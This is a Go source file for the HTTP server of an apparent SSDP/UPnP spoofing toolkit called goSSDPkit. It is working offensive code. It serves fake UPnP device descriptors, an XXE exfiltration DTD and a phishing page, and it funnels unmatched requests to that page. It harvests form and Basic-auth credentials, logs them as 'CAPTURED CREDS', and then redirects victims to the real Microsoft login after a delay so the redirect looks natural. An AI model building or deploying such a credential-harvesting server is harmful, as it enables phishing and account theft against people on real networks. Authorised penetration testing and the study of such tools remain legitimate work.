package upnp

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"goSSDPkit/pkg/ssdp"
	"goSSDPkit/pkg/template"
)

var (
	// Global logger instance for stdout capture
	Logger *UTCLogger
	once   sync.Once
)

// UTCLogger provides comprehensive logging with UTC timestamps
type UTCLogger struct {
	logFile   *os.File
	mutex     sync.Mutex
	stdoutBuf []byte
}

// InitLogger initializes the global UTC logger
func InitLogger() {
	once.Do(func() {
		Logger = &UTCLogger{}
		Logger.init()
	})
}

// init initializes the UTCLogger
func (l *UTCLogger) init() {
	// Create logs directory
	os.MkdirAll("logs", 0755)
	
	// Open log file
	var err error
	l.logFile, err = os.OpenFile("logs/goSSDPkit.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Printf("Failed to open log file: %v", err)
		return
	}
}

// Log logs a message with UTC timestamp to both console and file
func (l *UTCLogger) Log(format string, args ...interface{}) {
	if l == nil {
		return
	}
	
	l.mutex.Lock()
	defer l.mutex.Unlock()
	
	message := fmt.Sprintf(format, args...)
	timestamp := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	
	// Print to console (no timestamp)
	fmt.Printf("%s\n", message)
	
	// Write to log file with timestamp and stripped ANSI codes
	if l.logFile != nil {
		cleanMessage := l.stripANSI(message)
		logLine := fmt.Sprintf("[%s] %s\n", timestamp, cleanMessage)
		l.logFile.WriteString(logLine)
		l.logFile.Sync()
	}
}

// LogRaw logs a raw message with UTC timestamp (no extra formatting)
func (l *UTCLogger) LogRaw(message string) {
	if l == nil {
		return
	}
	
	l.mutex.Lock()
	defer l.mutex.Unlock()
	
	timestamp := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	
	// Print to console (raw, no timestamp)
	fmt.Print(message)
	
	// Write to log file with timestamp and stripped ANSI codes
	if l.logFile != nil {
		cleanMessage := l.stripANSI(message)
		logLine := fmt.Sprintf("[%s] %s", timestamp, cleanMessage)
		l.logFile.WriteString(logLine)
		l.logFile.Sync()
	}
}

// Close closes the logger resources
func (l *UTCLogger) Close() error {
	if l != nil && l.logFile != nil {
		return l.logFile.Close()
	}
	return nil
}

// stripANSI removes ANSI escape sequences from text
func (l *UTCLogger) stripANSI(text string) string {
	// Remove ANSI color codes and control sequences
	ansiRegex := regexp.MustCompile(`\x1b\[[0-9;]*[mGKHF]`)
	return ansiRegex.ReplaceAllString(text, "")
}

// Server represents the UPnP HTTP server
type Server struct {
	templateManager *template.Manager
	config          Config
	logger          *UTCLogger
}

// Config holds the configuration for the UPnP server
type Config struct {
	LocalIP     string
	LocalPort   int
	SMBServer   string
	RedirectURL string
	IsAuth      bool
	Realm       string
	SessionUSN  string
}

// NewServer creates a new UPnP HTTP server
func NewServer(templateManager *template.Manager, config Config) (*Server, error) {
	// Initialize global logger
	InitLogger()
	
	return &Server{
		templateManager: templateManager,
		config:          config,
		logger:          Logger,
	}, nil
}

// ServeHTTP implements the http.Handler interface
func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Handle assets FIRST to prevent redirect
	if strings.HasPrefix(r.URL.Path, "/assets/") {
		s.handleAssets(w, r)
		return
	}
	
	// Handle specific paths
	switch r.URL.Path {
	case "/ssdp/device-desc.xml":
		s.handleDeviceDesc(w, r)
	case "/ssdp/service-desc.xml":
		s.handleServiceDesc(w, r)
	case "/ssdp/xxe.html":
		s.handleXXE(w, r)
	case "/ssdp/data.dtd":
		s.handleDataDTD(w, r)
	case "/favicon.ico":
		s.handleFavicon(w, r)
	case "/ssdp/do_login.html":
		s.handleLogin(w, r)
	case "/present.html":
		s.handlePhishingPage(w, r)
	default:
		s.handleDefault(w, r)
	}
}

// handleDeviceDesc serves the device descriptor XML
func (s *Server) handleDeviceDesc(w http.ResponseWriter, r *http.Request) {
	s.logRequest(r, "XML REQUEST")

	xml, err := s.templateManager.BuildDeviceXML()
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error building device XML: %v", err)
		return
	}

	w.Header().Set("Content-Type", "application/xml")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(xml))
}

// handleServiceDesc serves the service descriptor XML
func (s *Server) handleServiceDesc(w http.ResponseWriter, r *http.Request) {
	s.logRequest(r, "XML REQUEST")

	xml, err := s.templateManager.BuildServiceXML()
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error building service XML: %v", err)
		return
	}

	w.Header().Set("Content-Type", "application/xml")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(xml))
}

// handleXXE handles XXE vulnerability detection
func (s *Server) handleXXE(w http.ResponseWriter, r *http.Request) {
	s.logger.Log("%sHost: %s, User-Agent: %s", ssdp.XXEBox, s.getClientIP(r), r.Header.Get("User-Agent"))
	s.logger.Log("               %s %s", r.Method, r.URL.Path)

	w.Header().Set("Content-Type", "application/xml")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("."))
}

// handleDataDTD serves the DTD file for XXE exploitation
func (s *Server) handleDataDTD(w http.ResponseWriter, r *http.Request) {
	s.logger.Log("%sHost: %s, User-Agent: %s", ssdp.XXEBox, s.getClientIP(r), r.Header.Get("User-Agent"))
	s.logger.Log("               %s %s", r.Method, r.URL.Path)

	dtd, err := s.templateManager.BuildExfilDTD()
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error building exfil DTD: %v", err)
		return
	}

	w.Header().Set("Content-Type", "application/xml")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(dtd))
}

// handleFavicon returns 404 for favicon requests
func (s *Server) handleFavicon(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusNotFound)
	w.Write([]byte("Not found."))
}

// handleLogin handles POST requests to the login form
func (s *Server) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		// Parse form data for credentials
		if err := r.ParseForm(); err != nil {
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")
		
		// Log captured credentials
		credentials := fmt.Sprintf("username=%s&password=%s", username, password)
		s.logger.Log("%sHOST: %s, CAPTURED CREDS: %s", ssdp.CredsBox, s.getClientIP(r), credentials)

		// Redirect to real Microsoft login after capturing credentials
		redirectURL := "https://login.microsoftonline.com/"
		
		// Add a small delay to make the redirect feel natural
		time.Sleep(500 * time.Millisecond)
		
		w.Header().Set("Location", redirectURL)
		w.WriteHeader(http.StatusFound) // 302 redirect
		return
	}

	http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
}

// handlePhishingPage serves the phishing page
func (s *Server) handlePhishingPage(w http.ResponseWriter, r *http.Request) {
	s.logRequest(r, "PHISH HOOKED")

	// Check for authentication if enabled
	if s.config.IsAuth {
		if !s.handleAuth(w, r) {
			return
		}
	}

	html, err := s.templateManager.BuildPhishHTML()
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		log.Printf("Error building phish HTML: %v", err)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(html))
}

// handleDefault handles all other requests
func (s *Server) handleDefault(w http.ResponseWriter, r *http.Request) {
	// Check for exfiltration attempts
	if strings.Contains(r.URL.Path, "exfiltrated") {
		s.logger.Log("%sHost: %s, User-Agent: %s", ssdp.ExfilBox, s.getClientIP(r), r.Header.Get("User-Agent"))
		s.logger.Log("               %s %s", r.Method, r.URL.Path)
	} else {
		s.logRequest(r, "DETECTION")
		s.logger.Log("%sOdd HTTP request from Host: %s, User Agent: %s", ssdp.DetectBox, s.getClientIP(r), r.Header.Get("User-Agent"))
		s.logger.Log("               %s %s", r.Method, r.URL.Path)
		s.logger.Log("               ... sending to phishing page.")
	}

	// Check for authentication if enabled
	if s.config.IsAuth {
		if !s.handleAuth(w, r) {
			return
		}
	}

	// Redirect to phishing page
	w.Header().Set("Location", "/present.html")
	w.WriteHeader(http.StatusMovedPermanently)
}

// handleAssets serves static assets (CSS, JS, images) from templates/assets directory
func (s *Server) handleAssets(w http.ResponseWriter, r *http.Request) {
	// Log asset request
	s.logger.Log("[ASSET] Serving asset: %s", r.URL.Path)
	
	// Remove /assets prefix to get the asset path
	assetPath := strings.TrimPrefix(r.URL.Path, "/assets/")
	filePath := filepath.Join("templates", "assets", assetPath)
	
	s.logger.Log("[ASSET] File path: %s", filePath)
	
	// Check if file exists
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		s.logger.Log("[ASSET] File not found: %s", filePath)
		http.NotFound(w, r)
		return
	}
	
	s.logger.Log("[ASSET] File found, serving: %s", filePath)
	
	// Check if file exists
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.NotFound(w, r)
		return
	}
	
	// Set appropriate content type based on file extension
	ext := strings.ToLower(filepath.Ext(assetPath))
	switch ext {
	case ".css":
		w.Header().Set("Content-Type", "text/css")
	case ".js":
		w.Header().Set("Content-Type", "application/javascript")
	case ".png":
		w.Header().Set("Content-Type", "image/png")
	case ".jpg", ".jpeg":
		w.Header().Set("Content-Type", "image/jpeg")
	case ".ico":
		w.Header().Set("Content-Type", "image/x-icon")
	case ".svg":
		w.Header().Set("Content-Type", "image/svg+xml")
	default:
		w.Header().Set("Content-Type", "application/octet-stream")
	}
	
	// Serve the file
	http.ServeFile(w, r, filePath)
}

// handleAuth handles basic authentication
func (s *Server) handleAuth(w http.ResponseWriter, r *http.Request) bool {
	authHeader := r.Header.Get("Authorization")
	
	if authHeader == "" {
		// Request authentication
		w.Header().Set("WWW-Authenticate", fmt.Sprintf("Basic realm=\"%s\"", s.config.Realm))
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("Unauthorized."))
		return false
	}

	if strings.HasPrefix(authHeader, "Basic ") {
		// Decode credentials and log them
		encoded := strings.TrimPrefix(authHeader, "Basic ")
		decoded, err := base64.StdEncoding.DecodeString(encoded)
		if err == nil {
			s.logger.Log("%sHOST: %s, BASIC-AUTH CREDS: %s", ssdp.CredsBox, s.getClientIP(r), string(decoded))
		}
		return true
	}

	// Unknown auth type
	w.WriteHeader(http.StatusInternalServerError)
	w.Write([]byte("Something happened."))
	return false
}

// logRequest logs HTTP requests with color coding and UTC timestamps
func (s *Server) logRequest(r *http.Request, requestType string) {
	clientIP := s.getClientIP(r)
	userAgent := r.Header.Get("User-Agent")

	var prefix string
	switch requestType {
	case "XML REQUEST":
		prefix = ssdp.XMLBox
	case "PHISH HOOKED":
		prefix = ssdp.PhishBox
	case "DETECTION":
		prefix = ssdp.DetectBox
	default:
		prefix = ssdp.NoteBox
	}

	// Log with UTC timestamp to both console and file
	s.logger.Log("%sHost: %s, User-Agent: %s", prefix, clientIP, userAgent)
	s.logger.Log("               %s %s", r.Method, r.URL.Path)
}

// getClientIP extracts the client IP from the request
func (s *Server) getClientIP(r *http.Request) string {
	// Check X-Forwarded-For header first
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return strings.Split(xff, ",")[0]
	}
	
	// Check X-Real-IP header
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}
	
	// Fall back to RemoteAddr
	return strings.Split(r.RemoteAddr, ":")[0]
}

// Close closes the server resources
func (s *Server) Close() error {
	if s.logger != nil {
		return s.logger.Close()
	}
	return nil
}

// Start starts the HTTP server
func (s *Server) Start(address string) error {
	server := &http.Server{
		Addr:    address,
		Handler: s,
	}
	
	s.logger.Log("%sHTTP server starting on %s", ssdp.OkBox, address)
	return server.ListenAndServe()
}